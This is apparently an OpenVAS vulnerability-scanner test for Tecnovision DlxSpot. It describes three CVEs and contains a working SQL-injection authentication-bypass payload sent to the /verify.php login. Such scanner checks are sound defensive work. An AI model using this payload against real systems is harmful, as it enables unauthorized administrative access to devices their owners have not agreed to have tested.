###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlxspot_mult_vuln.nasl 7631 2017-11-02 13:36:10Z jschulte $
#
# Tecnovision DlxSpot Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tecnovision:dlxspot";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140378");
  script_version("$Revision: 7631 $");
  script_tag(name: "last_modification", value: "$Date: 2017-11-02 14:36:10 +0100 (Thu, 02 Nov 2017) $");
  script_tag(name: "creation_date", value: "2017-09-20 13:15:09 +0700 (Wed, 20 Sep 2017)");
  script_tag(name: "cvss_base", value: "10.0");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-12928", "CVE-2017-12929", "CVE-2017-12930");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name("Tecnovision DlxSpot Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dlxspot_web_detect.nasl");
  script_mandatory_keys("dlxspot/installed");

  script_tag(name: "summary", value: "Tecnovison DlxSpot is prone to multiple vulnerabilities:

- Hardcoded Root SSH Password (CVE-2017-12928)

- Arbitrary File Upload to RCE (CVE-2017-12929)

- Admin Interface SQL Injection (CVE-2017-12930)");

  script_tag(name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response.");

  script_tag(name: "solution", value: "No solution or patch is available as of 2nd November, 2017. Information
regarding this issue will be updated once the solution details are available.");

  script_xref(name: "URL", value: "https://github.com/unknownpwn/unknownpwn.github.io/blob/master/README.md");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/verify.php";

data = 'loginusername=admin&loginpassword=x%27+or+%27x%27%3D%27x&save=+LOGIN+';

req = http_post_req(port: port, url: url, data: data,
                    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
res = http_keepalive_send_recv(port: port, data: req);

if ('src="playlist.php"' >< res && "<title>Dlxplayer</title>" >< res) {
  report = "It was possible to log in as admin by conducting an SQL injection.";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
